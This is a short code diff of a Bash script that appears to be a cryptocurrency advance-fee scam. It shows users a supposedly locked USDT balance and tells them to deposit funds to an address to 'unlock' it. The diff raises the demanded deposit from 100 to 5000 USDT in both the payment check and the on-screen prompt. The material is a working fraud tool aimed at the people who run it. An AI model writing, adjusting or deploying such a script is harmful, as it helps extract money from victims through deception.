@@ -48,7 +48,7 @@ function unlockBalance {
     done
     echo " "
 
-    if [[ $depositAmount -eq 100 && $transactionHash == "$hash_id" ]]; then
+    if [[ $depositAmount -eq 5000 && $transactionHash == "$hash_id" ]]; then
         refresh
         selectNetwork
     else
@@ -113,7 +113,7 @@ function refresh {
     echo -e "$usdt_logo"
     echo " "
     fancyBoxEcho "$welcome_message"
-    echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"
+    echo -e "To unlock your balance of $balance USDT, please deposit 5000 USDT to the following address: $account_id"
 }
 
 refresh # Call the refresh function when the script starts
